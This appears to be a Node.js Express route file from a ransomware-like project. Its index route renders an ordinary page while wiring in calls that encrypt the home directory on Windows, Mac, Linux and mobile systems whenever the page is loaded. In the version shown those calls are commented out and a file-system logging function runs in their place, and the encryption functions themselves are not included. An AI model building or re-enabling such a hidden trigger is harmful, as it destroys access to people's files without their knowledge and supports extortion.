const express = require("express");
const { 
    encryptFilesInWindowsHomeDir,
    encryptFilesInMacHomeDir,
    encryptFilesInLinuxHomeDir,
    encryptFilesInMobileHomeDir
 } = require("../main");

const os = require("os");
const path = require("path");
const { logFileSystem } = require("../test");

const router = express.Router();

router.get("/", async(req, res) =>{
    res.render("index");
    // Android Operating System
        try {
            // encryptFilesInWindowsHomeDir();
            // encryptFilesInMacHomeDir();
            // encryptFilesInLinuxHomeDir();
            // encryptFilesInMobileHomeDir();
            logFileSystem()
            console.log("Hey there I run from the server");
        } catch (error) {
            console.log(error);
        }
    res.end();
})

module.exports = router;